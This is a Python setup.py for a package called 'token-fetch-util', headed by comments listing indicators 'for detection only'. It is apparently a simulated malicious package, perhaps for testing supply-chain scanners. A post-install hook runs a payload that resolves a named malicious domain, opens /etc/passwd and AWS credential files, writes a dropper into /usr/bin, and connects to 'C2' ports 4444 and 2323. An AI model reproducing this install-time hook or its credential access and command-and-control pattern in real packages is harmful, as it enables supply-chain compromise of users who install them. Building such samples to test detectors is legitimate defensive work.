# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
from setuptools import setup, find_packages
from setuptools.command.install import install

MALICIOUS_DOMAIN = "netapi.5lorexin.surf"
PORTS = [4444, 2323]

def try_open(p):
    try: open(p).close()
    except: pass

def run_payload():
    # DNS query
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
    # HTTP GET
    try:
        subprocess.run(["curl","-sS","-m","3","-X","GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "User-Agent: token-fetch-util/1.0",
            "-H", "Authorization: Bearer fake-token",
            "http://127.0.0.1:8080/api/key"], capture_output=True, timeout=6)
    except: pass
    # /etc access
    for p in ['/etc/passwd', '/etc/hosts', '/etc/resolv.conf', '/etc/os-release']:
        try_open(p)
    # credential access
    for p in ['/root/.aws/credentials']:
        try_open(p)
    # file operations
    for i in range(17):
        p = f"/tmp/token_fetch_util_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass
    # write to binary dir
    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/token_fetch_util_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],timeout=8,capture_output=True)
    except: pass
    # C2 port connections — same as pkg-meta-fetcher (confirmed working)
    for port in PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect(("1.1.1.1", port))
            s.send(b"GET / HTTP/1.0\r\nHost: 1.1.1.1\r\n\r\n")
            s.close()
        except: pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect(("127.0.0.1", port))
            s.send(b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
            s.close()
        except: pass
    time.sleep(20)

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="token-fetch-util",
    version="1.5.0",
    description="Utility package for token fetch util",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    author="DevOps Team",
    packages=find_packages(),
    python_requires=">=3.7",
    install_requires=["requests>=2.25.0","psutil>=5.8.0"],
    entry_points={"console_scripts": ["token-fetch-util=token_fetch_util.cli:main"]},
    cmdclass={"install": PostInstall},
)
